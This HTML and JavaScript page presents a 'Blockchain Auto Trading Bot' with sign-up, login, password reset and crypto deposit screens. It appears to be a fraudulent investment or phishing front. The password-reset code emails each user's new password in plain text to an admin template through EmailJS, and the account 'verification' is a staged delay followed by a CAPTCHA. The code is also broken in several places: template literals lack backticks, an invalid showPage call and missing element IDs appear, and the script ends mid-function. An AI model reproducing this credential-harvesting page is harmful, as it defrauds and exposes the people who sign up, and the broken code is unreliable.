<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Meta and Title -->
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#0d0d2b" />
  <title>Auto-Trading Portfolio</title>

  <!-- Manifest and Favicon -->
  <link rel="manifest" href="/manifest.json" />
  <link rel="icon" href="/icons/icon-192.png" type="image/png" />

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />

  <!-- External Scripts -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
  <script src="https://s3.tradingview.com/tv.js"></script>
  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
  <!-- Service Worker -->
  <script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js')
        .then(reg => console.log('ServiceWorker registered: ', reg))
        .catch(error => console.error('ServiceWorker registration failed: ', error));
    }
  </script>

  <!-- EmailJS Init -->
  <script>
    emailjs.init("n9BsaM4ZjH178UeSf");
  </script>

  <!-- Base Styles -->
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #0d0d2b;
      color: white;
    }

    .hidden { display: none; }

    .token-logo { width: 32px; height: 32px; margin-right: 10px; }

    .token-row {
      display: flex;
      align-items: center;
      padding: 6px 0;
    }

    .token-row span { margin-left: auto; }

    .btn {
      background-color: #1e90ff;
      border: none;
      color: white;
      padding: 10px 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    .btn:hover { background-color: #0077cc; }

    .card {
      background-color: #1a1a40;
      padding: 16px;
      margin: 10px;
      border-radius: 12px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }
  </style>

  <!-- UI and Layout Styles -->
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(180deg, #0b1a2d 0%, #07111f 100%);
      color: #e0e7ff;
      overflow-x: hidden;
    }

    .page {
      display: none;
      padding: 2rem 1.5rem;
      max-width: 900px;
      margin: 0 auto;
      min-height: 100vh;
      box-sizing: border-box;
    }

    .active { display: block; }

    button {
      background-color: #2a72d6;
      border: none;
      border-radius: 8px;
      padding: 12px 28px;
      margin: 0.5rem 0.5rem 0.5rem 0;
      font-size: 1rem;
      color: white;
      cursor: pointer;
      font-weight: 600;
      transition: background-color 0.25s ease;
    }

    button:hover { background-color: #1952a6; }

    .btn-outline {
      background: transparent;
      border: 2px solid #4fc3f7;
      color: #4fc3f7;
    }

    .btn-outline:hover {
      background: #4fc3f7;
      color: #07111f;
    }

    input[type="text"], input[type="email"], input[type="password"] {
      width: 100%;
      max-width: 400px;
      padding: 10px 12px;
      margin: 0.5rem 0 1rem 0;
      border-radius: 6px;
      border: 1.5px solid #4fc3f7;
      background-color: #0b1a2d;
      color: #e0e7ff;
      font-size: 1rem;
      box-sizing: border-box;
    }

    input::placeholder { color: #7daedc; }

    h1, h2 {
      color: #4fc3f7;
      font-weight: 700;
    }

    .nav-button {
      cursor: pointer;
      font-weight: 700;
      color: #4fc3f7;
      margin-top: 1rem;
      user-select: none;
      display: inline-block;
    }

    .logo {
      width: 110px;
      margin-bottom: 2rem;
      filter: drop-shadow(0 0 4px #4fc3f7);
    }

    .partners {
      display: flex;
      justify-content: center;
      gap: 1.5rem;
      margin-top: 2rem;
      flex-wrap: wrap;
    }

    .partners img {
      height: 36px;
      filter: brightness(0) invert(1);
    }

    .error {
      color: #f44336;
      margin-top: -0.5rem;
      margin-bottom: 1rem;
    }

    #successPopup {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #198754;
      padding: 15px 25px;
      border-radius: 8px;
      color: white;
      font-weight: 600;
      display: none;
      z-index: 1000;
      box-shadow: 0 0 10px #198754;
    }

    #homepage section { margin-bottom: 2rem; }

    #coin-list {
      max-height: 180px;
      overflow-y: auto;
      border: 1px solid #4fc3f7;
      border-radius: 8px;
      padding: 1rem;
      background-color: #0b1a2d;
    }

    #coin-list ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }

    #coin-list li {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 8px;
      font-weight: 600;
    }

    #coin-list img {
      width: 24px;
      height: 24px;
      border-radius: 50%;
    }

    iframe {
      border-radius: 12px;
      border: none;
      width: 100%;
      max-width: 900px;
      height: 400px;
    }

    #captchaContainer {
      margin: 1rem 0;
      display: flex;
      justify-content: center;
    }
  </style>
</head>

<body>
<!-- PAGE 0: Landing Page -->
<section id="page0" class="page active min-h-screen flex flex-col items-center justify-center px-6 py-10 bg-[#0B0F1C] text-white">

  <!-- Official Blockchain Logo Image -->
  <div class="w-full flex justify-center mb-6">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARcAAACBCAMAAABAHsZDAAAAIVBMVEUAAAD///+Wlpb8/PzZ2dn19fXU1NTV1dXa2trx8fHKysojlmkeAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAChElEQVR4nO2a6XKDIAyFbc3+/0+QhYglkWi7NzTP7n9YO2DleO+BGCEGjRo0aNGjRo0aNGjRo0aNGjRo0aNGjRo0aNFj/UDaS7pNLuEl+bIuIh2gFM9avvhy6LVtUWHChZbCBYWFxPqezbJKkoCDZQndYrRGocOKNGoD/FxRQShnNBby0G0PnrIwhbZXt/hkxN3hU64tX6nq4vbwIfcfhsW2xJ3+KJG8ev6rK5GLLpVbGfDB/vUFXaeZDPjvxrMyVg8L4AJeqmfMw//pELFceylADq3vwXt5J2Wz8OM0DtZMQM75MreV5bBLKNTOC0nlrcHL2B7VZuhRyNq7RCaWnHdeNNW1s+h3WY9dcSxa17VKF+y3KR1q86VoU5kz2E8srsuXRZ8dcJk8g/tOpoSFGZ1YPbHXM97bRv2e+5Z7UbsYfLPNx3dW5XvD4jUOzZVRyifVe4N1XK8L6kPKKuMboJktKlLu3V63c4P5ZHtPPtb+deI22g0aNGjRo0aNGjRo0aNGjRo0aNGjRo0aNGjRo3Yv+AfMeB4W9mKsnAAAAAElFTkSuQmCC" 
         alt="Blockchain Logo" 
         class="h-20 w-auto object-contain drop-shadow-xl" />
  </div>

  <!-- Heading & Subtitle -->
  <h1 class="text-3xl md:text-4xl font-bold text-center mb-4">Welcome to Blockchain Auto Trading Bot</h1>
  <p class="text-center text-gray-300 max-w-2xl mb-6">
    <strong class="text-white">24/7 Intelligent Crypto Trading. Powered by Blockchain.</strong><br /><br />
    Our AI-driven auto-trading platform monitors and executes trades across major chains like Binance Smart Chain, Ethereum, and more ‚Äî with complete transparency and control.
  </p>

  <!-- Key Features -->
  <ul class="text-sm md:text-base text-left space-y-2 mb-6 text-blue-100 font-medium max-w-md">
    <li>‚úÖ AI-Powered Strategy Execution</li>
    <li>‚úÖ Binance, Ethereum, BSC & More</li>
    <li>‚úÖ Auto-Buy/Sell on Market Trends</li>
    <li>‚úÖ Fully On-Chain Verified</li>
    <li>‚úÖ Live Dashboard with Alerts</li>
  </ul>

  <!-- Trading Philosophy -->
  <p class="text-gray-400 text-sm text-center mb-8 max-w-xl">
    <strong class="text-white">You stay in control.</strong><br />
    Define your strategy, risk thresholds, and favorite tokens. Our bot does the work while you focus on results ‚Äî all from a simple dashboard.
  </p>

  <!-- CTA Buttons -->
  <div class="flex space-x-4 mb-10">
    <button onclick="showPage('1')" class="px-6 py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-blue-500 to-indigo-600 hover:opacity-90 transition-all">
      Sign Up
    </button>
    <button onclick="showPage('2')" class="px-6 py-3 rounded-xl font-semibold text-indigo-500 border border-indigo-500 hover:bg-indigo-500 hover:text-white transition-all">
      Login
    </button>
  </div>

  <!-- Market Overview -->
  <section id="marketOverview" class="w-full max-w-3xl p-4 bg-[#0d111c] rounded-xl text-white mb-8">
    <h2 class="text-xl font-bold mb-4">Market Overview</h2>

    <!-- Coin Logos -->
    <div id="coinLogos" class="flex gap-4 mb-4">
      <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC Logo" class="h-8 w-8" />
      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="h-8 w-8" />
      <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB Logo" class="h-8 w-8" />
    </div>

    <!-- TradingView Ticker -->
    <div class="tradingview-widget-container mb-4">
      <div class="tradingview-widget-container__widget"></div>
      <script type="text/javascript" async src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js">
      {
        "symbols": [
          { "proName": "BINANCE:BTCUSDT", "title": "Bitcoin" },
          { "proName": "BINANCE:BNBUSDT", "title": "BNB" },
          { "proName": "BINANCE:USDTUSD", "title": "Tether" }
        ],
        "colorTheme": "dark",
        "isTransparent": false,
        "displayMode": "adaptive",
        "locale": "en"
      }
      </script>
    </div>

    <!-- TradingView Screener -->
    <div class="tradingview-widget-container">
      <div class="tradingview-widget-container__widget"></div>
      <script type="text/javascript" async src="https://s3.tradingview.com/external-embedding/embed-widget-screener.js">
      {
        "width": "100%",
        "height": "380",
        "defaultColumn": "overview",
        "screener_type": "crypto_mkt",
        "displayMode": "compact",
        "colorTheme": "dark",
        "locale": "en",
        "isTransparent": false,
        "showSymbolLogo": true,
        "symbols": [
          { "s": "BINANCE:BTCUSDT", "d": "Bitcoin" },
          { "s": "BINANCE:BNBUSDT", "d": "BNB" },
          { "s": "BINANCE:USDTUSD", "d": "Tether" }
        ]
      }
      </script>
    </div>
  </section>
</section>

<!-- PAGE 1: SIGN UP -->
  <section id="page1" class="page px-6 py-10 max-w-md mx-auto">
  <h2 class="text-2xl font-bold mb-4">Create Your Account</h2>
  <form id="signUpForm" novalidate>
    <input type="text" id="signFullName" placeholder="Full Name" required class="w-full mb-4 p-3 rounded bg-[#1c2232] border border-gray-600" />
    <input type="email" id="signEmail" placeholder="Email Address" required class="w-full mb-4 p-3 rounded bg-[#1c2232] border border-gray-600" />
    <input type="password" id="signPassword" placeholder="Password" required class="w-full mb-4 p-3 rounded bg-[#1c2232] border border-gray-600" />
    <button type="submit" class="w-full py-3 bg-blue-600 hover:bg-blue-700 rounded font-semibold">Sign Up</button>
  </form>
</section>
  <!-- PAGE 1i: AUTHENTICATING -->
  <section id="page1i" class="page flex items-center justify-center min-h-screen text-center">
  <div>
    <h2 class="text-xl font-bold mb-2">Authenticating...</h2>
    <p class="text-gray-400">Please wait while we verify your details.</p>
  </div>
</section>
  <!-- PAGE 1ii: CAPTCHA VERIFICATION -->
  <section id="page1ii" class="page px-6 py-10 max-w-md mx-auto">
  <h2 class="text-2xl font-bold mb-4">Security Check</h2>
  <p class="mb-4">Please complete the CAPTCHA below to continue:</p>
  <div class="mb-4">
    <div class="h-captcha" data-sitekey="4e5a8260-9554-439c-8d58-76f04ca823c8"></div>
  </div>
  <button id="btnCaptchaSubmit" class="w-full py-3 bg-green-600 hover:bg-green-700 rounded font-semibold">Verify & Continue</button>
  <p id="captchaError" class="text-red-500 text-sm mt-2"></p>
</section>
  <!-- PAGE 3: HOMEPAGE -->
  <section id="page3" class="page px-6 py-10 max-w-md mx-auto">
  <h2 class="text-2xl font-bold mb-4">Welcome, <span id="profileName"></span>!</h2>
  <p class="mb-4 text-gray-400">Your email: <span id="profileEmail"></span></p>
</section>

<!-- PAGE 2: Login -->
<section id="page2" class="page bg-[#0d111c] text-white px-6 py-10 rounded-xl max-w-md mx-auto shadow-lg">
  <h2 class="text-2xl font-bold mb-4">Login to Your Account</h2>
  <form id="loginForm" novalidate>
    <input type="email" id="loginEmail" name="login_email" placeholder="Email" autocomplete="email" required class="w-full mb-4 p-3 rounded-lg bg-[#1c2232] border border-gray-600" />
    <input type="password" id="loginPassword" name="login_password" placeholder="Password" autocomplete="current-password" required class="w-full mb-4 p-3 rounded-lg bg-[#1c2232] border border-gray-600" />
    <button type="submit" id="btnLoginSubmit" class="w-full py-3 bg-blue-600 hover:bg-blue-700 rounded-lg font-semibold">Login</button>
    <p class="error text-red-500 text-sm mt-2" id="loginError" aria-live="assertive"></p>
  </form>
  <button id="btnForgotPassword" class="w-full mt-4 text-sm text-blue-400 underline">Forgot Password / Reset</button>
  <button onclick="showPage('0')" class="mt-2 w-full text-center text-blue-400 underline">‚Üê Back to Landing</button>
</section>

<!-- PAGE 3i: Forgot Password / CAPTCHA Verification -->
<section id="page3i" class="page" aria-label="Forgot Password CAPTCHA Verification">
  <h2>Verify You're Human</h2>
  <div id="captchaContainer"></div>
  <button id="btnCaptchaVerify" disabled>Verify</button>
  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Login" id="btnBackToLoginFromCaptcha">&lt; Back</div>
  <p class="error" id="captchaError" aria-live="assertive"></p>
</section>

<!-- PAGE 3ii: Enter New Password -->
<section id="page3ii" class="page" aria-label="Reset Password">
  <h2>Set New Password</h2>
  <input type="password" id="newPassword" placeholder="New Password" autocomplete="new-password" required />
  <input type="password" id="confirmNewPassword" placeholder="Confirm New Password" autocomplete="new-password" required />
  <button id="btnConfirmNewPassword">Confirm</button>
  <div class="nav-button" tabindex="0" role="button" aria-label="Back to Login" id="btnBackToLoginFromReset">&lt; Back</div>
  <p class="error" id="resetPasswordError" aria-live="assertive"></p>
</section>

<!-- PAGE 3: Homepage -->
<section id="page3" class="page" aria-label="Homepage Dashboard">
  <h2>Welcome to Your Dashboard</h2>
  <p id="welcomeUserName"></p>
  <section>
    <h3>Live TradingView Chart</h3>
    <!-- TradingView Widget -->
    <iframe
      src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_01&symbol=BINANCE:BTCUSDT&interval=60&hidesidetoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=[]&theme=dark&style=1&timezone=Etc/UTC&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&locale=en&utm_source=blockchain&utm_medium=widget&utm_campaign=chart"
      allowfullscreen
      loading="lazy"
      title="Live BTC/USDT TradingView Chart"
      style="width:100%;height:400px;border:none;border-radius:12px;"
    ></iframe>
  </section>

  <section>
    <h3>Live Coin Prices (CoinGecko API)</h3>
    <div id="coin-list" aria-live="polite" aria-atomic="true" aria-relevant="additions">
      <ul id="coinListUL"></ul>
    </div>
  </section>

  <section>
    <h3>Market News (TradingView)</h3>
    <iframe
      src="https://s.tradingview.com/embed-widget/tickers/?locale=en"
      style="width: 100%; height: 300px; border-radius: 12px; border:none;"
      frameborder="0"
      scrolling="no"
      title="Market News"
      loading="lazy"
    ></iframe>
  </section>

  <button id="btnViewPortfolio" class="btn-outline" aria-label="View Main Portfolio">View Main Portfolio</button>
  <button id="btnLogout" class="btn-outline" aria-label="Logout">Logout</button>
</section>


<!-- Auto-Trading Portfolio Page4 -->
<div id="page4" class="page" style="
  display:none;
  background-color:#0B0E11;
  color:#FFFFFF;
  padding:24px;
  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  min-height:100vh;
  box-sizing:border-box;
">

  <h2 style="margin-bottom:32px; font-weight:700; font-size:1.8rem;">
    ü§ñ Auto-Trading Portfolio
  </h2>

  <!-- Total Balance -->
  <section style="margin-bottom:32px;">
    <strong style="font-size:1.25rem; font-weight:700;">Total Balance</strong>
    <div id="dashboardBalance" style="
      font-size:2rem;
      font-weight:800;
      margin-top:8px;
      color:#4fc3f7;
      letter-spacing: 0.02em;
    ">$0.00</div>
  </section>

  <!-- Live Prices Section -->
  <section style="
    background:#12171d;
    padding:20px;
    border-radius:16px;
    margin-bottom:40px;
  ">
    <strong style="font-size:1.25rem; font-weight:700; display:block; margin-bottom:16px;">
      Live Prices
    </strong>
    <div id="livePrices" style="
      display:flex;
      gap:32px;
      flex-wrap:wrap;
      font-weight:700;
      font-size:1.125rem;
      justify-content:space-between;
    ">
      <div>BTC: <span id="btcPrice" style="color:#f7931a;">$0.00</span></div>
      <div>ETH: <span id="ethPrice" style="color:#627eea;">$0.00</span></div>
      <div>BNB: <span id="bnbPrice" style="color:#f3ba2f;">$0.00</span></div>
      <div>USDT: <span id="usdtPrice" style="color:#26a17b;">$0.00</span></div>
    </div>
  </section>

  <!-- TradingView Live Chart -->
  <section style="
    background:#12171d;
    border-radius:16px;
    padding:16px;
    margin-bottom:40px;
  ">
    <strong style="font-size:1.25rem; font-weight:700; display:block; margin-bottom:16px;">
      üìà Live Price Performance Chart
    </strong>
    <div id="tradingview_chart" style="height:400px; border-radius:12px; overflow:hidden;"></div>
  </section>

  <!-- Deposit Section -->
  <section style="
    background:#12171d;
    padding:24px;
    border-radius:16px;
    margin-bottom:40px;
  ">
    <h3 style="font-weight:700; margin-bottom:24px;">üí∞ Deposit Funds</h3>

    <label for="depositAmount" style="display:block; font-weight:600; margin-bottom:8px;">Deposit Amount (USD):</label>
    <input type="number" id="depositAmount" placeholder="Enter amount" style="
      width:100%;
      padding:14px;
      font-size:1rem;
      border-radius:12px;
      border:none;
      background:#0b131e;
      color:#fff;
      margin-bottom:20px;
    " />

    <label for="depositNetwork" style="display:block; font-weight:600; margin-bottom:8px;">Network:</label>
    <select id="depositNetwork" style="
      width:100%;
      padding:14px;
      font-size:1rem;
      border-radius:12px;
      border:none;
      background:#0b131e;
      color:#fff;
      margin-bottom:20px;
    ">
      <option value="BTC">Bitcoin</option>
      <option value="ETH">Ethereum</option>
      <option value="BNB">Binance Smart Chain</option>
      <option value="SOL">Solana</option>
      <option value="TRX">Tron</option>
    </select>

    <label for="depositCode" style="display:block; font-weight:600; margin-bottom:8px;">Admin Deposit Code:</label>
    <input type="text" id="depositCode" placeholder="Enter deposit code" style="
      width:100%;
      padding:14px;
      font-size:1rem;
      border-radius:12px;
      border:none;
      background:#0b131e;
      color:#fff;
      margin-bottom:24px;
    " />

    <button id="btnConfirmDeposit" style="
      width:100%;
      background:#1F6FEB;
      padding:16px;
      font-weight:700;
      border:none;
      border-radius:16px;
      font-size:1.1rem;
      color:#fff;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#155FCC'" onmouseout="this.style.background='#1F6FEB'">
      Confirm Deposit
    </button>
  </section>

  <!-- Receive Section -->
  <section style="
    background:#12171d;
    padding:24px;
    border-radius:16px;
    margin-bottom:40px;
  ">
    <h3 style="font-weight:700; margin-bottom:24px;">üì• Receive Crypto</h3>

    <label for="receiveToken" style="display:block; font-weight:600; margin-bottom:12px;">Select Token:</label>
    <select id="receiveToken" style="
      width:100%;
      padding:14px;
      font-size:1rem;
      border-radius:12px;
      border:none;
      background:#0b131e;
      color:#fff;
      margin-bottom:24px;
    ">
      <option value="USDT">USDT</option>
      <option value="BTC">BTC</option>
      <option value="ETH">ETH</option>
      <option value="BNB">BNB</option>
      <option value="SOL">SOL</option>
      <option value="TRX">TRX</option>
    </select>

    <button onclick="showReceiveAddress()" style="
      width:100%;
      background:#28a745;
      padding:16px;
      font-weight:700;
      border:none;
      border-radius:16px;
      font-size:1.1rem;
      color:#fff;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#1f7e32'" onmouseout="this.style.background='#28a745'">
      Show Receive Address
    </button>

    <div id="receiveAddressBox" style="
      margin-top:20px;
      background:#0B131E;
      padding:20px;
      border-radius:16px;
      color:#4fc3f7;
      word-break: break-word;
      display:none;
      font-weight:700;
      font-size:1.1rem;
    "></div>
  </section>

  <!-- Navigation Buttons -->
  <nav style="
    display:flex;
    gap:20px;
    flex-wrap:wrap;
    justify-content:center;
  ">
    <button onclick="showPage(13)" style="
      flex:1 1 140px;
      padding:16px;
      background:#1F6FEB;
      color:#fff;
      border:none;
      border-radius:20px;
      font-weight:700;
      font-size:1.1rem;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#155FCC'" onmouseout="this.style.background='#1F6FEB'">
      Wallet
    </button>
    <button onclick="showPage(12)" style="
      flex:1 1 140px;
      padding:16px;
      background:#333;
      color:#fff;
      border:none;
      border-radius:20px;
      font-weight:700;
      font-size:1.1rem;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#4a4a4a'" onmouseout="this.style.background='#333'">
      Settings
    </button>
    <button onclick="showPage(3iii)" style="
      flex:1 1 140px;
      padding:16px;
      background:#333;
      color:#fff;
      border:none;
      border-radius:20px;
      font-weight:700;
      font-size:1.1rem;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#4a4a4a'" onmouseout="this.style.background='#333'">
      Receive
    </button>
    <button onclick="showPage(8)" style="
      flex:1 1 140px;
      padding:16px;
      background:#333;
      color:#fff;
      border:none;
      border-radius:20px;
      font-weight:700;
      font-size:1.1rem;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#4a4a4a'" onmouseout="this.style.background='#333'">
      Send
    </button>
    <button onclick="showPage(16)" style="
      flex:1 1 140px;
      padding:16px;
      background:#28a745;
      color:#fff;
      border:none;
      border-radius:20px;
      font-weight:700;
      font-size:1.1rem;
      cursor:pointer;
      transition: background-color 0.3s;
    " onmouseover="this.style.background='#1f7e32'" onmouseout="this.style.background='#28a745'">
      Trade
    </button>
  </nav>

</div>
<!-- For live coins display on homepage -->
<ul id="coinListUL" class="space-y-2 text-sm text-gray-700">
  <!-- Coins will be injected here -->
</ul>

<!-- Success popup -->
<div id="successPopup" class="fixed top-5 right-5 bg-green-500 text-white py-2 px-4 rounded shadow-lg hidden"></div>
 
 <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
<!-- EmailJS SDK -->
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script><script>
  // EmailJS Configuration
  emailjs.init("n9BsaM4ZjH178UeSf");
  const serviceID = "service_xg8bzqs";
  const adminTemplateID = "template_gclz9gu";
  const autoReplyTemplateID = "template_r0zg4zj";

  // Global State
  let userData = {};
  let countdown = 60;
  let countdownInterval = null;
  let isCaptchaVerified = false;
  let hcaptchaWidgetId = null;
  let currentLoggedInUserEmail = "";

  // ---------- Page Navigation ----------
  function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id)?.classList.add('active');
    clearErrors();
    if (id === 'page3') fetchCoinGeckoData();
  }

  const btnMap = {
    btnGoSignUp: 'page1',
    btnGoLogin: 'page2',
    btnBackToLandingFromSignUp: 'page0',
    btnBackToLandingFromLogin: 'page0',
    btnBackToSignUpFromVerify: 'page1',
    btnBackToLoginFromCaptcha: 'page2',
    btnBackToLoginFromReset: 'page2',
    btnBackToHomeFromPortfolio: 'page3',
  };

  Object.entries(btnMap).forEach(([btnID, pageID]) => {
    document.getElementById(btnID)?.addEventListener('click', () => {
      if (btnID === 'btnBackToLoginFromCaptcha') isCaptchaVerified = false;
      showPage(pageID);
    });
  });

  // ---------- Helper Functions ----------
  function clearErrors() {
    document.querySelectorAll('.error').forEach(e => e.textContent = '');
  }

  function showSuccessPopup(message = "Verification Successful!") {
    const popup = document.getElementById('successPopup');
    popup.textContent = message;
    popup.style.display = 'block';
    setTimeout(() => popup.style.display = 'none', 3000);
  }

  function startCountdown() {
    clearInterval(countdownInterval);
    countdown = 60;
    updateCountdownText();
    countdownInterval = setInterval(() => {
      countdown--;
      updateCountdownText();
      if (countdown <= 0) clearInterval(countdownInterval);
    }, 1000);
  }

  function updateCountdownText() {
    const el = document.getElementById('countdownText');
    if (el) el.textContent = `Resend available in ${countdown}s`;
  }

  // ---------- Sign Up ----------
  document.getElementById('btnSignUpSubmit').addEventListener('click', () => {
    const fullName = document.getElementById('signFullName').value.trim();
    const email = document.getElementById('signEmail').value.trim().toLowerCase();
    const password = document.getElementById('signPassword').value.trim();

    if (!fullName || !email || !password) return alert("Please fill all fields.");

    userData = { fullName, email, password };

    const params = {
      to_name: fullName,
      to_email: email,
      message: `Click the link below to verify your email and activate your account.`
    };

    // Send auto-reply and show authenticating screen
    emailjs.send(serviceID, autoReplyTemplateID, params)
      .then(() => {
        showPage('page1i');
        setTimeout(() => {
          showPage('page1ii');
          loadCaptcha();
        }, 10000);
      })
      .catch(() => alert("Failed to send verification email."));
  });

  // ---------- CAPTCHA ----------
  function loadCaptcha() {
    const container = document.getElementById('captchaContainer');
    container.innerHTML = "";

    if (!document.getElementById('hcaptcha-script')) {
      const script = document.createElement('script');
      script.id = 'hcaptcha-script';
      script.src = 'https://hcaptcha.com/1/api.js?render=explicit';
      script.async = true;
      script.defer = true;
      document.body.appendChild(script);
      script.onload = renderCaptcha;
    } else {
      renderCaptcha();
    }
  }

  function renderCaptcha() {
    if (window.hcaptcha && hcaptchaWidgetId === null) {
      hcaptchaWidgetId = window.hcaptcha.render('captchaContainer', {
        sitekey: '4e5a8260-9554-439c-8d58-76f04ca823c8',
        size: 'normal',
        callback: onCaptchaSuccess,
        'error-callback': onCaptchaError,
        'expired-callback': onCaptchaExpired
      });
    }
    document.getElementById('btnCaptchaVerify').disabled = true;
  }

  function onCaptchaSuccess(token) {
    isCaptchaVerified = true;
    document.getElementById('captchaError').textContent = "";
    document.getElementById('btnCaptchaVerify').disabled = false;
  }

  function onCaptchaError() {
    isCaptchaVerified = false;
    document.getElementById('captchaError').textContent = "Captcha error.";
  }

  function onCaptchaExpired() {
    isCaptchaVerified = false;
    document.getElementById('captchaError').textContent = "Captcha expired.";
  }

  document.getElementById('btnCaptchaVerify').addEventListener('click', () => {
    if (!isCaptchaVerified) return alert("Please complete captcha.");
    document.getElementById('welcomeUserName').textContent = `Hello, ${userData.fullName}`;
    showSuccessPopup("Email verified and account activated!");
    showPage('page3');
  });

  // ---------- Login ----------
  document.getElementById('loginForm').addEventListener('submit', (e) => { e.preventDefault(); clearErrors();

const email = document.getElementById('loginEmail').value.trim().toLowerCase(); const password = document.getElementById('loginPassword').value.trim();

if (!email || !password) { return document.getElementById('loginError').textContent = "Please fill in both fields."; }

if (email === userData.email && password === userData.password) { currentLoggedInUserEmail = email; document.getElementById('welcomeUserName').textContent = Hello, ${userData.fullName}; showPage('page3'); } else { document.getElementById('loginError').textContent = "Invalid credentials. Please try again."; } });

// ---------- Forgot Password & CAPTCHA ---------- 
  document.getElementById('btnForgotPassword').addEventListener('click', () => { showPage('page3i'); loadCaptcha(); });

function loadCaptcha() { const container = document.getElementById('captchaContainer'); container.innerHTML = "";

if (!document.getElementById('hcaptcha-script')) { const script = document.createElement('script'); script.id = 'hcaptcha-script'; script.src = 'https://hcaptcha.com/1/api.js?render=explicit'; script.async = true; script.defer = true; document.body.appendChild(script); script.onload = renderCaptcha; } else { renderCaptcha(); } }

function renderCaptcha() { if (window.hcaptcha && hcaptchaWidgetId === null) { hcaptchaWidgetId = window.hcaptcha.render('captchaContainer', { sitekey: '4e5a8260-9554-439c-8d58-76f04ca823c8', size: 'normal', callback: onCaptchaSuccess, 'error-callback': onCaptchaError, 'expired-callback': onCaptchaExpired }); } document.getElementById('btnCaptchaVerify').disabled = true; }

function onCaptchaSuccess(token) { isCaptchaVerified = true; document.getElementById('captchaError').textContent = ""; document.getElementById('btnCaptchaVerify').disabled = false; }

function onCaptchaError() { isCaptchaVerified = false; document.getElementById('captchaError').textContent = "Captcha error. Please try again."; }

function onCaptchaExpired() { isCaptchaVerified = false; document.getElementById('captchaError').textContent = "Captcha expired. Please complete it again."; }

document.getElementById('btnCaptchaVerify').addEventListener('click', () => { if (!isCaptchaVerified) return alert("Please complete the CAPTCHA."); showPage('page3ii'); });

// ---------- Reset Password ---------- 
  document.getElementById('btnConfirmNewPassword').addEventListener('click', () => { clearErrors();

const newPass = document.getElementById('newPassword').value.trim(); const confirmPass = document.getElementById('confirmNewPassword').value.trim();

if (!newPass || !confirmPass) { return document.getElementById('resetPasswordError').textContent = "Please fill in both fields."; } if (newPass !== confirmPass) { return document.getElementById('resetPasswordError').textContent = "Passwords do not match."; } if (newPass.length < 6) { return document.getElementById('resetPasswordError').textContent = "Password must be at least 6 characters."; }

const email = currentLoggedInUserEmail || userData.email; const notifyAdmin = { to_email: email, message: Password reset: ${newPass} }; const notifyUser = { to_email: email, new_password: newPass };

emailjs.send(serviceID, adminTemplateID, notifyAdmin) .then(() => emailjs.send(serviceID, autoReplyTemplateID, notifyUser)) .then(() => { userData.password = newPass; showSuccessPopup("Password reset successful!"); document.getElementById('welcomeUserName').textContent = Hello, ${userData.fullName}; showPage('page3'); isCaptchaVerified = false; if (window.hcaptcha && hcaptchaWidgetId !== null) { window.hcaptcha.reset(hcaptchaWidgetId); document.getElementById('btnCaptchaVerify').disabled = true; } }) .catch(err => { alert("Password reset failed. Please try again."); console.error(err); }); });

// ---------- Logout & Portfolio ---------- 
  document.getElementById('btnLogout').addEventListener('click', () => { currentLoggedInUserEmail = ""; showPage('page0'); });

document.getElementById('btnViewPortfolio').addEventListener('click', () => { showPage('page4'); });

// ---------- CoinGecko Market Data ---------- 
  async function fetchCoinGeckoData() { const ul = document.getElementById('coinListUL'); ul.innerHTML = "<li>Loading...</li>";

try { const res = await fetch("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1"); if (!res.ok) throw new Error("Failed to fetch market data."); const coins = await res.json();

ul.innerHTML = "";
coins.forEach(c => {
  const li = document.createElement('li');
  li.innerHTML = `<img src="${c.image}" style="width:24px;height:24px;"> <strong>${c.symbol.toUpperCase()}</strong>: $${c.current_price.toLocaleString()}`;
  ul.appendChild(li);
});

} catch (err) { ul.innerHTML = "<li>Unable to load market data.</li>"; console.error(err); } }


  // ---------- CoinGecko Market Data ----------
  async function fetchCoinGeckoData() {
